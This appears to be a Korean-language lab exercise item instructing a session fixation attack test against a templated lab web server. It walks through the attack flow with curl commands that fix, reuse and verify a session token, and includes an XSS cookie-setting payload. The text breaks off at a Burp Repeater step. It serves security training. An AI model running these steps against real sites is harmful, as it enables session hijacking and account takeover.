- order: 5
  instruction: |-
    {{WEB_IP}} 대상으로 세션 고정 공격 테스트를 수행하시오.

    ■ 실습 방법

    ▶ 1단계: 세션 고정 공격 흐름
    ```
    1. 공격자가 valid 세션 ID 획득 (사이트 정상 방문)
    2. 피해자에게 그 세션 ID 강제 (URL/cookie 주입)
    3. 피해자가 그 세션으로 로그인
    4. 서버가 로그인 시 세션 ID 재발급 안 하면
       → 공격자가 같은 세션 ID 로 인증된 액세스 획득
    ```

    ▶ 2단계: 도구 A — curl 으로 세션 고정 검증
    ```bash
    # Stage 1: 공격자가 세션 받음
    curl -c /tmp/attacker_cookies.txt http://10.20.30.80/
    cat /tmp/attacker_cookies.txt | grep session
    # 예: token=ATTACKER_SESS_123

    # Stage 2: 피해자에게 그 토큰 강제 (URL 또는 XSS)
    # 방법 A: URL 파라미터로 세션 ID 전달 (URL rewriting 활성 시)
    curl "http://10.20.30.80/?session=ATTACKER_SESS_123"

    # 방법 B: XSS 로 cookie 설정
    # <script>document.cookie='session=ATTACKER_SESS_123; path=/'</script>

    # Stage 3: 피해자가 로그인 (강제된 세션 사용)
    curl -b /tmp/attacker_cookies.txt -X POST http://10.20.30.80/rest/user/login \
         -d '{"email":"victim@x.com","password":"pass"}' -c /tmp/after_login.txt
    diff /tmp/attacker_cookies.txt /tmp/after_login.txt
    # 변경 없음 = 세션 재발급 안 함 = 취약

    # Stage 4: 공격자가 재사용
    curl -b "session=ATTACKER_SESS_123" http://10.20.30.80/dashboard
    # 200 + 피해자 데이터 = 세션 고정 성공
    echo "세션 고정 공격 테스트 완료"
    ```

    ▶ 3단계: 도구 B — Burp Repeater 으로 검증
    1. 비로그인 상태 응답에서 세션 ID 추출
